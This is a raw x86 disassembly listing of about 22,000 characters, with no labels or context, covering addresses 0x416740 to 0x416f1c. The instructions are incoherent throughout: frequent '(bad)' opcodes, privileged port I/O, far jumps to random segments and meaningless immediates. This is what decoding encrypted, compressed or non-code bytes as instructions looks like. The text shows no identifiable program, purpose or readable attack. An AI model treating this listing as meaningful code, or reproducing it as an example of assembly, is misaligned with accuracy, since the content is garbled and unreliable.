  416740:	sysret 
  416742:	inc    ebp
  416743:	jns    0x416786
  416745:	push   0xf9581994
  41674a:	shl    DWORD PTR [ecx],0x98
  41674d:	int    0x43
  41674f:	(bad)  
  416750:	xchg   esp,eax
  416751:	in     eax,0x9a
  416753:	lods   al,BYTE PTR ds:[esi]
  416754:	push   cs
  416755:	(bad)  
  416757:	adc    BYTE PTR [esi],al
  416759:	adc    BYTE PTR [eax+0x5a66e7e],0x8e
  416760:	inc    ebx
  416761:	jecxz  0x41671b
  416763:	sti    
  416764:	pushf  
  416765:	add    DWORD PTR [esp+eiz*4],ebp
  416768:	ficomp DWORD PTR [ebp+0xb]
  41676b:	mov    ecx,0x2021793
  416770:	xor    ebp,esi
  416772:	stc    
  416773:	int    0x76
  416775:	cli    
  416776:	cli    
  416777:	or     al,0x54
  416779:	sub    esi,DWORD PTR [ecx+0x6b]
  41677c:	outs   dx,BYTE PTR ds:[esi]
  41677d:	sub    bh,ah
  41677f:	inc    esi
  416780:	cmp    esp,DWORD PTR [ebp+0x51db0316]
  416786:	pop    esp
  416787:	popa   
  416788:	add    eax,0x43732bf2
  41678d:	xchg   ebp,eax
  41678e:	xor    ecx,DWORD PTR [esi+ecx*8+0x45]
  416792:	mov    edx,0xff3596ad
  416797:	mov    fs,WORD PTR [ecx+eax*2-0x27]
  41679b:	mov    ah,0xe6
  41679d:	cmp    eax,0x6fa93e1b
  4167a2:	cwde   
  4167a3:	aad    0x7f
  4167a5:	adc    eax,0x127eb73e
  4167aa:	(bad)  
  4167ab:	into   
  4167ac:	dec    edx
  4167ad:	int3   
  4167ae:	or     al,0x34
  4167b0:	test   BYTE PTR [ebx],al
  4167b2:	dec    esp
  4167b3:	add    cl,BYTE PTR [edx]
  4167b5:	sbb    edi,DWORD PTR gs:[ecx+ebx*8+0x4741e69e]
  4167bd:	mov    eax,0xa5b24133
  4167c2:	push   ebp
  4167c3:	jp     0x41674b
  4167c5:	mov    al,ds:0x6eb5455d
  4167ca:	fld    TBYTE PTR [ebp+0x42]
  4167cd:	rcl    DWORD PTR [ebp-0x30],0x24
  4167d1:	mov    dh,0xc3
  4167d3:	sbb    ch,al
  4167d5:	add    eax,DWORD PTR [edx+eax*8-0x36c62b08]
  4167dc:	sbb    DWORD PTR [edx],ebx
  4167de:	cmp    DWORD PTR ds:0xbc7585d,edx
  4167e4:	mov    ecx,0x60af5772
  4167e9:	push   ecx
  4167ea:	dec    esi
  4167eb:	push   ebp
  4167ec:	push   ds
  4167ed:	shl    DWORD PTR [esi+0x2e],0xb6
  4167f1:	and    eax,0x9a4a28e2
  4167f6:	add    eax,0x3fa68fec
  4167fb:	mov    cl,0x60
  4167fd:	(bad)  
  4167fe:	and    bl,BYTE PTR [esi+0x4ada1d1b]
  416804:	into   
  416805:	or     esi,DWORD PTR [esi]
  416807:	sub    dh,ch
  416809:	push   ecx
  41680a:	popa   
  41680b:	jg     0x416858
  41680d:	mov    eax,ds:0xf59d9e7e
  416812:	or     ah,al
  416814:	fisubr DWORD PTR [esi+0x29bdeda8]
  41681a:	(bad)  
  41681b:	neg    DWORD PTR [edx-0x59]
  41681e:	mov    cl,0x7d
  416820:	lods   al,BYTE PTR ds:[esi]
  416821:	shl    BYTE PTR ds:0x38187674,1
  416827:	inc    esi
  416828:	xor    eax,0x473d6b40
  41682d:	lods   al,BYTE PTR ds:[esi]
  41682e:	js     0x4167d3
  416830:	out    0x5b,eax
  416832:	fldenv [ebx-0x10]
  416835:	pop    es
  416836:	push   edx
  416837:	cmp    eax,edx
  416839:	jmp    0x41681c
  41683b:	pop    DWORD PTR [ecx]
  41683d:	push   ebx
  41683e:	pop    es
  41683f:	popa   
  416840:	xor    ah,BYTE PTR [edx-0x41]
  416843:	in     al,0x89
  416845:	(bad)  
  416846:	xor    al,0x88
  416848:	fwait
  416849:	int    0x9
  41684b:	push   ebp
  41684c:	cmp    DWORD PTR [edi-0x760069d3],0x5eafd59d
  416856:	mov    ecx,0xc5fb7ce6
  41685b:	mov    ds,WORD PTR [edx]
  41685d:	mov    al,0xec
  41685f:	or     al,0x58
  416861:	pop    esi
  416862:	xor    BYTE PTR [ecx],dh
  416864:	popa   
  416865:	lahf   
  416866:	jae    0x416882
  416868:	imul   edi,DWORD PTR [edi-0x19],0x27c3c266
  41686f:	and    eax,0x6c5cb3cd
  416874:	adc    al,0x7a
  416876:	gs dec ebx
  416878:	aas    
  416879:	lds    ebp,FWORD PTR [eax+0x3b]
  41687c:	jge    0x41689c
  41687e:	cmp    DWORD PTR [ecx+0x7538462c],0x59
  416885:	inc    ecx
  416886:	adc    ebx,DWORD PTR [edx]
  416888:	scas   al,BYTE PTR es:[edi]
  416889:	lds    esi,FWORD PTR [ebx]
  41688b:	shl    BYTE PTR [ecx-0x7b404eaf],0xcd
  416892:	retf   0x2d44
  416895:	int    0xa7
  416897:	sub    eax,0x9732eaf2
  41689c:	dec    edi
  41689d:	or     esi,DWORD PTR [edx+0x529df6db]
  4168a3:	loope  0x4168ab
  4168a5:	push   DWORD PTR [ebp-0x50]
  4168a8:	mov    ds:0x6470f430,eax
  4168ad:	mov    cl,0x5d
  4168af:	pop    edx
  4168b0:	xor    DWORD PTR [edi-0x54764a97],ecx
  4168b6:	adc    eax,0x88b9ecaf
  4168bb:	into   
  4168bc:	fisttp WORD PTR [eax-0x4f]
  4168bf:	dec    esi
  4168c0:	fist   DWORD PTR [esi+0x11]
  4168c3:	mov    cl,0x44
  4168c5:	jo     0x4168af
  4168c7:	adc    ch,BYTE PTR [edx-0xc]
  4168ca:	pushf  
  4168cb:	sbb    edi,DWORD PTR [esi-0x33]
  4168ce:	ret    
  4168cf:	dec    eax
  4168d0:	dec    ebx
  4168d1:	sbb    cl,bl
  4168d3:	imul   ebp,eax,0x5a63785d
  4168d9:	and    dh,cl
  4168db:	push   0x39c335c1
  4168e0:	mov    ebx,ebp
  4168e2:	bnd jno 0x41693b
  4168e5:	in     al,dx
  4168e6:	xor    eax,0xf5aabea5
  4168eb:	cmp    ch,bl
  4168ed:	inc    edx
  4168ee:	sbb    ebp,ecx
  4168f0:	push   es
  4168f1:	in     al,0x44
  4168f3:	and    DWORD PTR [esi+0x5a],eax
  4168f6:	mov    cl,0x48
  4168f8:	sub    ebp,DWORD PTR [esi+0x2d21a118]
  4168fe:	mov    BYTE PTR [esi-0x7ab1e41a],dl
  416904:	or     eax,0x892d9744
  416909:	adc    BYTE PTR ds:0x52e9c886,dh
  41690f:	sub    al,0x5b
  416911:	addr16 cmp al,0xc
  416914:	rcl    BYTE PTR [ebp-0x2ff0c5bf],cl
  41691a:	daa    
  41691b:	fcomp  DWORD PTR [ebx]
  41691d:	pushf  
  41691e:	mov    bh,0xc4
  416920:	push   edx
  416921:	ret    
  416922:	pop    ebp
  416923:	dec    ebp
  416924:	jo     0x416920
  416926:	and    dh,BYTE PTR [ebx]
  416928:	popf   
  416929:	xor    dh,BYTE PTR gs:[ebx-0x41]
  41692d:	in     al,0x90
  41692f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416930:	push   0xb4e3e41b
  416935:	mul    al
  416937:	adc    eax,0x56c02498
  41693c:	xchg   esp,eax
  41693d:	test   DWORD PTR [eax],0xae106909
  416943:	mov    esi,0x7db961b0
  416948:	aad    0x1d
  41694a:	pusha  
  41694b:	sahf   
  41694c:	std    
  41694d:	scas   eax,DWORD PTR es:[edi]
  41694e:	xor    eax,0xa13bdb29
  416953:	jecxz  0x416900
  416955:	inc    esi
  416956:	cmc    
  416957:	lea    edi,[edi+0x0]
  41695a:	jne    0x416920
  41695c:	into   
  41695d:	nop
  41695e:	dec    ecx
  41695f:	pushf  
  416960:	sub    eax,0x2f5b3bf7
  416965:	int3   
  416966:	mov    WORD PTR [eax],gs
  416968:	or     ah,BYTE PTR [ebx+ebp*2-0x70]
  41696c:	std    
  41696d:	dec    ecx
  41696e:	xchg   esi,eax
  41696f:	inc    eax
  416970:	xchg   DWORD PTR [esi],edi
  416972:	(bad)  
  416974:	xchg   ebx,eax
  416975:	mov    bl,0x54
  416977:	leave  
  416978:	ins    BYTE PTR es:[edi],dx
  416979:	cli    
  41697a:	push   esi
  41697b:	aas    
  41697c:	ds and eax,ebx
  41697f:	shl    DWORD PTR [edi+0x77],0x77
  416983:	out    dx,al
  416984:	dec    esi
  416985:	(bad)  
  416987:	xchg   ecx,eax
  416988:	loopne 0x416915
  41698a:	jns    0x41699d
  41698c:	lock call 0x33a6:0x57440cb1
  416994:	sbb    dl,BYTE PTR [ebp+0xf7e0cec]
  41699a:	and    eax,0xd3306eb9
  41699f:	and    bl,ah
  4169a1:	rol    DWORD PTR [ebp+0x395cc84b],cl
  4169a7:	jb     0x416a00
  4169a9:	mov    bl,0x9a
  4169ab:	xor    al,0x7d
  4169ad:	cld    
  4169ae:	retf   
  4169af:	fild   DWORD PTR [edi-0x3765fcc7]
  4169b5:	mov    ch,BYTE PTR ds:0xffae3c4f
  4169bb:	xchg   DWORD PTR cs:[esi-0x4c],esp
  4169bf:	xlat   BYTE PTR ds:[ebx]
  4169c0:	or     eax,0x500d1aa7
  4169c5:	mov    esp,0xab394d6a
  4169ca:	sbb    al,0xc
  4169cc:	lods   al,BYTE PTR ds:[esi]
  4169cd:	xchg   ebx,eax
  4169ce:	add    ah,BYTE PTR [eax+edi*8+0x24]
  4169d2:	int3   
  4169d3:	inc    ebx
  4169d4:	lds    esp,FWORD PTR [edi]
  4169d6:	(bad)  
  4169d7:	adc    ebp,ecx
  4169d9:	sub    BYTE PTR [edx+esi*1],ch
  4169dc:	lock je 0x416a0d
  4169df:	fmulp  st(3),st
  4169e1:	(bad)  
  4169e3:	lahf   
  4169e4:	call   0x36b5:0x68ea9589
  4169eb:	nop
  4169ec:	push   ss
  4169ed:	sub    DWORD PTR [edx],0x66d5754
  4169f3:	mov    ebx,0x4d5489cf
  4169f8:	ja     0x416a0e
  4169fa:	je     0x416a20
  4169fc:	in     al,0x1d
  4169fe:	stc    
  4169ff:	mov    ch,0x4e
  416a01:	into   
  416a02:	push   esi
  416a03:	dec    edi
  416a04:	neg    BYTE PTR [ecx-0x1b]
  416a07:	pop    edi
  416a08:	jmp    0x8a982e0a
  416a0d:	mov    WORD PTR [ebx+ebx*1],ss
  416a10:	retf   0x9113
  416a13:	aas    
  416a14:	mov    ch,0xe6
  416a16:	cmc    
  416a17:	pop    ebp
  416a18:	mov    esi,0xd3bd6e1b
  416a1d:	fs in  eax,0x73
  416a20:	cmp    BYTE PTR [ecx-0x71],bh
  416a23:	cdq    
  416a24:	hlt    
  416a25:	ins    BYTE PTR es:[edi],dx
  416a26:	clc    
  416a27:	cld    
  416a28:	cdq    
  416a29:	mov    esi,0x2f736e48
  416a2e:	pop    ds
  416a2f:	pop    eax
  416a30:	or     eax,0x1e0b50d2
  416a35:	mov    ch,0x5a
  416a37:	out    0xc1,eax
  416a39:	inc    ebp
  416a3a:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  416a3c:	mov    dl,0x6b
  416a3e:	push   ss
  416a3f:	addr16 (bad) 
  416a41:	lock xor DWORD PTR [edx+ebp*8],eax
  416a45:	pusha  
  416a46:	shl    DWORD PTR [ebp-0x541c680e],cl
  416a4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a4d:	ds jnp 0x4169e9
  416a50:	std    
  416a51:	arpl   bx,si
  416a53:	inc    edi
  416a54:	xor    DWORD PTR cs:[eax],0x24
  416a58:	mov    bl,0x34
  416a5a:	push   ds
  416a5b:	and    edx,edi
  416a5d:	mov    DWORD PTR ss:[edx+0x5d90099e],edi
  416a64:	loope  0x416a87
  416a66:	dec    eax
  416a67:	push   es
  416a68:	shr    DWORD PTR [esi],cl
  416a6a:	les    esi,FWORD PTR [edx]
  416a6c:	ins    BYTE PTR es:[edi],dx
  416a6d:	in     al,0xf4
  416a6f:	loop   0x416a4f
  416a71:	ror    DWORD PTR [ebx-0x38],cl
  416a74:	and    al,0x5f
  416a76:	int3   
  416a77:	fdiv   QWORD PTR [eax]
  416a79:	mov    esp,0xff9a8a92
  416a7e:	mov    bh,BYTE PTR [ecx-0x4f]
  416a81:	xlat   BYTE PTR ds:[ebx]
  416a82:	sub    esi,eax
  416a84:	loope  0x416a1c
  416a86:	dec    esi
  416a87:	inc    edi
  416a88:	hlt    
  416a89:	mov    ebp,0xe61237f5
  416a8e:	and    al,0x3c
  416a90:	lock inc edx
  416a92:	pop    edi
  416a93:	push   edi
  416a94:	in     eax,0xd7
  416a96:	ror    DWORD PTR [ebp+0x61],1
  416a99:	jmp    0x416a61
  416a9b:	loopne 0x416a34
  416a9d:	inc    edx
  416a9e:	xchg   edx,eax
  416a9f:	je     0x416a2b
  416aa1:	add    esi,DWORD PTR [ebp-0x6fa85381]
  416aa7:	imul   esi,edx,0xffffffae
  416aaa:	xchg   ebp,eax
  416aab:	stos   BYTE PTR es:[edi],al
  416aac:	shl    esp,1
  416aae:	out    0xa3,al
  416ab0:	cmp    BYTE PTR [ebx],ah
  416ab2:	test   DWORD PTR ds:0x49544e7c,edx
  416ab8:	dec    edx
  416ab9:	sub    eax,0x54b7db27
  416abe:	scas   eax,DWORD PTR es:[edi]
  416abf:	cmp    edi,edx
  416ac1:	stc    
  416ac2:	sbb    DWORD PTR [ecx],esi
  416ac4:	cld    
  416ac5:	and    al,0x6a
  416ac7:	inc    ecx
  416ac8:	(bad)  
  416ac9:	fs call 0x3001c67d
  416acf:	or     dl,cl
  416ad1:	data16 and al,0x91
  416ad4:	push   ebp
  416ad5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ad6:	xor    esp,ecx
  416ad8:	pop    ebx
  416ad9:	add    eax,0xcdd76295
  416ade:	imul   eax,DWORD PTR [edx],0x5bec36bf
  416ae4:	shl    BYTE PTR [edi+0x2b],cl
  416ae7:	clc    
  416ae8:	xor    esi,DWORD PTR [edi-0x65]
  416aeb:	xor    DWORD PTR [esi+0x7],0xffffff97
  416aef:	dec    esi
  416af0:	ds or  al,0x5f
  416af3:	push   ebp
  416af4:	bound  ebx,QWORD PTR [edi*2-0xb9fb4b4]
  416afb:	mov    bl,0x88
  416afd:	imul   eax,DWORD PTR [esi+ebx*2+0x49],0x93ea4da2
  416b05:	xor    dh,dl
  416b07:	(bad)  
  416b08:	fnstcw WORD PTR [eax-0x6cbb19fe]
  416b0e:	jns    0x416b7d
  416b10:	sub    DWORD PTR [eax-0x558a8000],ebp
  416b16:	fisub  DWORD PTR [esi+0x74711ba7]
  416b1c:	or     al,0x64
  416b1e:	loop   0x416b0d
  416b20:	push   edx
  416b21:	in     al,dx
  416b22:	mov    dh,0x7b
  416b24:	rol    al,1
  416b26:	outs   dx,DWORD PTR ds:[esi]
  416b28:	scas   eax,DWORD PTR es:[edi]
  416b29:	outs   dx,BYTE PTR ds:[esi]
  416b2a:	sub    ah,BYTE PTR [ecx-0x23]
  416b2d:	icebp  
  416b2e:	pop    ebx
  416b2f:	outs   dx,BYTE PTR ds:[esi]
  416b30:	push   ebx
  416b31:	xor    cl,BYTE PTR [ecx-0x11]
  416b34:	test   eax,0x90163da8
  416b39:	lahf   
  416b3a:	or     ah,ah
  416b3c:	call   0x22ecc3f
  416b41:	out    0xe1,al
  416b43:	fstp   DWORD PTR [edi+ebx*4]
  416b46:	jnp    0x416b3a
  416b48:	mov    eax,ds:0x2c5260b0
  416b4d:	jl     0x416b0a
  416b4f:	inc    eax
  416b50:	xchg   BYTE PTR [eax+0x20],al
  416b53:	jae    0x416b29
  416b55:	mov    bh,0xe0
  416b57:	dec    ebp
  416b58:	and    al,0x16
  416b5a:	jmp    eax
  416b5c:	sar    DWORD PTR [edi],1
  416b5e:	outs   dx,DWORD PTR ds:[esi]
  416b5f:	xor    edi,DWORD PTR [edi+0x67568e07]
  416b65:	dec    esi
  416b66:	dec    edi
  416b67:	inc    ecx
  416b68:	jmp    0x185b:0xe824913e
  416b6f:	or     esp,DWORD PTR ds:0xc0b112db
  416b75:	js     0x416b56
  416b77:	inc    esi
  416b78:	call   0x8964:0x6840ac9a
  416b7f:	in     al,0x99
  416b81:	(bad)
  416b84:	in     al,0x14
  416b86:	leave  
  416b87:	popf   
  416b88:	push   ds
  416b89:	fld    QWORD PTR [edx+0x158f7ceb]
  416b8f:	xchg   ecx,eax
  416b90:	xchg   esi,eax
  416b91:	jns    0x416bcc
  416b93:	sub    eax,0x4bfe23ef
  416b98:	imul   ecx,DWORD PTR [ebx],0x2098410c
  416b9e:	adc    dh,BYTE PTR [ebp+0x704ef91c]
  416ba4:	cmp    eax,0x96097ccd
  416ba9:	add    eax,0x4cb21349
  416bae:	dec    ebx
  416baf:	push   eax
  416bb0:	popf   
  416bb1:	(bad)  
  416bb2:	ins    DWORD PTR es:[edi],dx
  416bb3:	stc    
  416bb4:	sahf   
  416bb5:	and    BYTE PTR [esi+0x1105ec9a],0xe2
  416bbc:	test   BYTE PTR [eax-0x4a],0x3a
  416bc0:	pop    esp
  416bc1:	aad    0xad
  416bc3:	xor    ebx,esp
  416bc5:	cmc    
  416bc6:	sbb    eax,DWORD PTR [ebp+ebp*4-0x65]
  416bca:	(bad)
  416bce:	jne    0x416b7c
  416bd0:	clc    
  416bd1:	xchg   edx,eax
  416bd2:	mov    edx,0xce6d0fb0
  416bd7:	sub    BYTE PTR [ebx+0x3c80173a],bl
  416bdd:	sbb    BYTE PTR [ebx-0x5d],0x22
  416be1:	xor    BYTE PTR [esi-0x7cc85a9f],al
  416be7:	jo     0x416c50
  416be9:	loopne 0x416bb9
  416beb:	adc    eax,0x7b109e64
  416bf0:	xor    al,0xde
  416bf2:	inc    ebx
  416bf3:	(bad)  
  416bf4:	cmp    esi,DWORD PTR [edi-0x37]
  416bf7:	or     eax,0x295bc790
  416bfc:	fwait
  416bfd:	cmp    al,0xf7
  416bff:	leave  
  416c00:	pop    edx
  416c01:	out    0x9f,eax
  416c03:	ror    BYTE PTR [edx+0x91ffbf2],0xb2
  416c0a:	jl     0x416bad
  416c0c:	mov    al,0x9b
  416c0e:	xchg   edi,eax
  416c0f:	jb     0x416b94
  416c11:	push   esp
  416c12:	not    cl
  416c14:	jbe    0x416bb9
  416c16:	gs popf 
  416c18:	pushf  
  416c19:	and    edi,0x46
  416c1c:	xlat   BYTE PTR ds:[ebx]
  416c1d:	js     0x416c6d
  416c1f:	sar    DWORD PTR [ecx-0x6b9a6617],1
  416c25:	aas    
  416c26:	push   ebp
  416c27:	push   0x42
  416c29:	sbb    ah,BYTE PTR [esi]
  416c2b:	loop   0x416ca6
  416c2d:	inc    ebx
  416c2e:	jb     0x416c55
  416c30:	js     0x416c9f
  416c32:	stos   BYTE PTR es:[edi],al
  416c33:	sbb    BYTE PTR [eax],bh
  416c35:	popf   
  416c36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c37:	sbb    bl,BYTE PTR [ecx-0x6e3fef68]
  416c3d:	pushf  
  416c3e:	scas   al,BYTE PTR es:[edi]
  416c3f:	cmp    edi,DWORD PTR [edx]
  416c41:	bound  eax,QWORD PTR ds:0x8966da6d
  416c47:	mov    ecx,DWORD PTR [ebx-0x67fca46]
  416c4d:	push   ds
  416c4e:	mov    ecx,DWORD PTR [edi]
  416c50:	fadd   DWORD PTR [eax]
  416c52:	sub    edx,DWORD PTR [ebp-0x695f1819]
  416c58:	rcl    bl,cl
  416c5a:	shl    esp,0x25
  416c5d:	inc    esp
  416c5e:	std    
  416c5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c60:	jmp    DWORD PTR [edx]
  416c62:	popf   
  416c63:	sbb    DWORD PTR [edx+0x3260ae68],esi
  416c69:	je     0x416cb1
  416c6b:	inc    eax
  416c6c:	test   DWORD PTR [ebx],edx
  416c6e:	jmp    0x6e42:0x39a3b6b9
  416c75:	lods   al,BYTE PTR ds:[esi]
  416c76:	jno    0x416c72
  416c78:	loop   0x416c57
  416c7a:	sbb    ah,bl
  416c7c:	fst    DWORD PTR [edi]
  416c7e:	push   edx
  416c7f:	in     eax,dx
  416c80:	je     0x416c22
  416c82:	ret    
  416c83:	add    al,0x1
  416c85:	dec    edi
  416c86:	mov    edx,DWORD PTR ds:0x4f5fd82a
  416c8c:	mov    eax,ds:0x82d04d91
  416c91:	inc    edi
  416c92:	dec    esi
  416c93:	inc    esp
  416c94:	int    0x3d
  416c96:	jne    0x416d02
  416c98:	shl    DWORD PTR [edi],1
  416c9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c9b:	or     dl,BYTE PTR [edx]
  416c9d:	int3   
  416c9e:	mov    edx,0xed07b5af
  416ca3:	rcl    BYTE PTR [ebp+0x57],cl
  416ca6:	dec    ebp
  416ca7:	les    ecx,FWORD PTR [eax+eax*1]
  416caa:	outs   dx,BYTE PTR ds:[esi]
  416cab:	loop   0x416ce1
  416cad:	adc    BYTE PTR [esi+0x3c35ac0f],cl
  416cb3:	loope  0x416c50
  416cb5:	aas    
  416cb6:	(bad)  
  416cb7:	rcr    DWORD PTR [edx+0x47],1
  416cba:	mov    ebx,0xdf2cffa0
  416cbf:	fmulp  st(2),st
  416cc1:	mov    ch,cl
  416cc3:	xlat   BYTE PTR ds:[ebx]
  416cc4:	in     eax,dx
  416cc5:	aad    0xfa
  416cc7:	jb     0x416cdf
  416cc9:	xor    ebx,DWORD PTR [ebx+eax*2]
  416ccc:	xor    ebp,DWORD PTR [edi-0x3223910f]
  416cd2:	xchg   eax,edx
  416cd4:	jmp    0xb8f2316a
  416cd9:	hlt    
  416cda:	pop    ss
  416cdb:	mov    eax,DWORD PTR [edx+ebp*4+0x5f]
  416cdf:	and    DWORD PTR ds:0x86a7d2a6,ebp
  416ce5:	jle    0x416d57
  416ce7:	(bad)  [edx-0x31]
  416cea:	sbb    DWORD PTR [eax+ebx*4+0x5b],0xb44dcdb5
  416cf2:	repnz cmp ch,BYTE PTR ds:0xfa67163b
  416cf9:	or     DWORD PTR [edx-0x2a],edx
  416cfc:	xor    eax,0x52347b55
  416d01:	sub    edi,edx
  416d03:	xor    ch,dl
  416d05:	pop    ds
  416d06:	xchg   esp,eax
  416d07:	xchg   esp,eax
  416d08:	js     0x416c8a
  416d0a:	rcr    bl,1
  416d0c:	mov    bl,0x6d
  416d0e:	ja     0x416ca6
  416d10:	ins    BYTE PTR es:[edi],dx
  416d11:	fsub   DWORD PTR ds:0x9e765839
  416d17:	iret   
  416d18:	shl    BYTE PTR [esi-0x36791ad1],cl
  416d1e:	mov    eax,0x784c404
  416d23:	add    eax,0xa941b822
  416d28:	mov    ebx,0xe2b42b87
  416d2d:	mov    ah,0xe6
  416d2f:	arpl   WORD PTR [eax+edx*2-0x6645b022],dx
  416d36:	imul   esi,DWORD PTR [edi+eax*2-0x75],0xd
  416d3b:	retf   
  416d3c:	sbb    BYTE PTR [esi-0x1e8d1f07],ch
  416d42:	cmp    eax,0x3881510c
  416d47:	mov    ah,0xf7
  416d49:	pop    DWORD PTR [ebx+0x2]
  416d4c:	retf   0xb646
  416d4f:	sub    ch,BYTE PTR [esi+0x18]
  416d52:	xchg   ebx,eax
  416d53:	cmp    DWORD PTR [esi+0x58],esi
  416d56:	adc    ch,BYTE PTR [ebp+0x8ab6318]
  416d5c:	jo     0x416d2f
  416d5e:	add    DWORD PTR [ecx-0x2e],edi
  416d61:	fwait
  416d62:	je     0x416d73
  416d64:	and    dh,cl
  416d66:	test   eax,0xfc0dec0d
  416d6b:	out    0x10,eax
  416d6d:	sbb    cl,BYTE PTR [ecx]
  416d6f:	pusha  
  416d70:	test   eax,0x7558b972
  416d75:	push   eax
  416d76:	jmp    0x423a:0x13ab793c
  416d7d:	test   DWORD PTR [esi-0x12],esi
  416d80:	(bad)
  416d85:	ret    
  416d86:	bound  esi,QWORD PTR ds:0xe5b2c039
  416d8c:	jmp    0x4546:0x49db3527
  416d93:	out    0x9,al
  416d95:	ret    
  416d96:	mov    ch,0xe3
  416d98:	addr16 mov dh,0x35
  416d9b:	push   esi
  416d9c:	inc    ebp
  416d9d:	mov    esi,0xf014ddd5
  416da2:	add    DWORD PTR [edi],esp
  416da4:	rcr    DWORD PTR [ebx+eax*4-0x80],0x94
  416da9:	fild   DWORD PTR [esi+0xc]
  416dac:	inc    esi
  416dad:	mov    bh,BYTE PTR [esi+0x1f]
  416db0:	arpl   WORD PTR [eax-0x71],bp
  416db3:	jg     0x416df5
  416db5:	push   es
  416db6:	mov    bl,0x2c
  416db8:	std    
  416db9:	adc    ch,bl
  416dbb:	and    DWORD PTR [esi-0x62],edx
  416dbe:	lock pop esi
  416dc0:	(bad)  
  416dc1:	pop    ebp
  416dc2:	dec    ebp
  416dc3:	push   esi
  416dc4:	mov    ecx,0x1aca2978
  416dc9:	fild   WORD PTR [eax]
  416dcb:	pop    ss
  416dcc:	push   0xea31e61c
  416dd1:	jns    0x416e3c
  416dd3:	popf   
  416dd4:	call   0x7f43:0x9b94e754
  416ddb:	inc    esi
  416ddc:	add    BYTE PTR [edx-0x8a48fef],bh
  416de2:	mov    esi,0xbe4ea9e3
  416de7:	daa    
  416de8:	bound  ebx,QWORD PTR [esi-0x36]
  416deb:	and    DWORD PTR [ebx+0x5c1afa43],ebp
  416df1:	mov    cl,0xb4
  416df3:	mov    fs,ecx
  416df5:	fcom   DWORD PTR [esi+0x37]
  416df8:	dec    esp
  416df9:	cli    
  416dfa:	mov    bl,0xf2
  416dfc:	pop    eax
  416dfd:	push   0x413b7279
  416e02:	popf   
  416e03:	pop    ebp
  416e04:	inc    ebx
  416e05:	cmp    cl,BYTE PTR [esi-0x43]
  416e08:	sbb    DWORD PTR [esi-0x3b],ecx
  416e0b:	mov    eax,0xb6e2d3c4
  416e10:	push   ebx
  416e11:	dec    ecx
  416e12:	mov    ds:0x88a39e30,al
  416e17:	xchg   edi,eax
  416e18:	and    al,bl
  416e1a:	ret    0x5b4c
  416e1d:	sar    dl,1
  416e1f:	mov    al,ds:0xef6d28cf
  416e24:	test   DWORD PTR [edi+ebp*4-0x19],0xb1e1c9c4
  416e2c:	stc    
  416e2d:	pop    edx
  416e2e:	and    DWORD PTR [ebp+0x239be928],esi
  416e34:	ins    DWORD PTR es:[edi],dx
  416e35:	daa    
  416e36:	aaa    
  416e37:	or     DWORD PTR [eax+0x49],esi
  416e3a:	dec    ecx
  416e3b:	push   es
  416e3c:	mov    esp,0x926fb54c
  416e41:	sbb    eax,0x20f82096
  416e46:	mov    BYTE PTR [ecx],bl
  416e48:	std    
  416e49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e4a:	(bad)  
  416e4b:	jnp    0x416eb6
  416e4d:	add    ch,BYTE PTR [ebp+0x6f46f5e4]
  416e53:	ret    0x2f19
  416e56:	pop    edx
  416e57:	test   DWORD PTR [ebp+edi*4+0x21f6fcc0],ebp
  416e5e:	mov    ds:0x59cced2f,eax
  416e63:	sbb    eax,0x5f2d6006
  416e68:	aad    0xc6
  416e6a:	lock daa 
  416e6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e6d:	xchg   esi,eax
  416e6e:	ret    
  416e6f:	out    dx,al
  416e70:	and    ebx,DWORD PTR [edx]
  416e72:	push   ecx
  416e73:	or     al,0x69
  416e75:	cld    
  416e76:	and    edx,DWORD PTR [edi]
  416e78:	jl     0x416eb8
  416e7a:	leave  
  416e7b:	sahf   
  416e7c:	(bad)  [ecx+0x3f]
  416e7f:	jo     0x416e0d
  416e81:	ds ja  0x416e9a
  416e84:	pop    edi
  416e85:	in     al,dx
  416e86:	sub    cl,BYTE PTR [ecx-0x25416653]
  416e8c:	cmc    
  416e8d:	sub    BYTE PTR [ecx-0x32],al
  416e90:	or     DWORD PTR [edi-0x14],0x27
  416e94:	ja     0x416ea8
  416e96:	retf   
  416e97:	mov    ss,WORD PTR [eax+0x71566851]
  416e9d:	jge    0x416e9d
  416e9f:	sahf   
  416ea0:	test   DWORD PTR [eax+0x119efaa5],esp
  416ea6:	ret    0xa8d4
  416ea9:	enter  0x5028,0xa
  416ead:	and    DWORD PTR [ebp+0x35dd4fbf],esi
  416eb3:	or     eax,DWORD PTR [esi+0x6790c006]
  416eb9:	scas   al,BYTE PTR es:[edi]
  416eba:	leave  
  416ebb:	xor    DWORD PTR [eax+0x76],0x3584a5fd
  416ec2:	and    ah,BYTE PTR [edx-0x7b]
  416ec5:	mov    bh,0x4f
  416ec7:	push   es
  416ec8:	push   es
  416ec9:	ror    DWORD PTR [eax],cl
  416ecb:	xchg   esi,eax
  416ecc:	pop    edx
  416ecd:	inc    esp
  416ece:	(bad)  
  416ed0:	aaa    
  416ed1:	icebp  
  416ed2:	into   
  416ed3:	cmc    
  416ed4:	dec    ecx
  416ed5:	pop    es
  416ed6:	mov    ebp,0xe497db25
  416edb:	imul   ecx,DWORD PTR [ecx+0xe8d2370],0xffffffe4
  416ee2:	int3   
  416ee3:	daa    
  416ee4:	sbb    ah,BYTE PTR [edx+0x34e9e1f5]
  416eea:	sbb    dl,BYTE PTR [edx+esi*2-0x67]
  416eee:	icebp  
  416eef:	pop    ds
  416ef0:	jbe    0x416f04
  416ef2:	nop
  416ef3:	(bad)  
  416ef4:	jl     0x416f07
  416ef6:	xchg   ebx,eax
  416ef7:	push   esp
  416ef8:	dec    esp
  416ef9:	add    ah,bh
  416efb:	jmp    0x5c6:0x32da7880
  416f02:	adc    al,0xbf
  416f04:	adc    DWORD PTR [esp+eax*4-0x31c441d3],0x49cb6667
  416f0f:	mov    ecx,0xb8c45463
  416f14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f15:	cmp    ebx,ebp
  416f17:	jmp    0x11e157c1
  416f1c:	outs   dx,DWORD PTR ds:[esi]
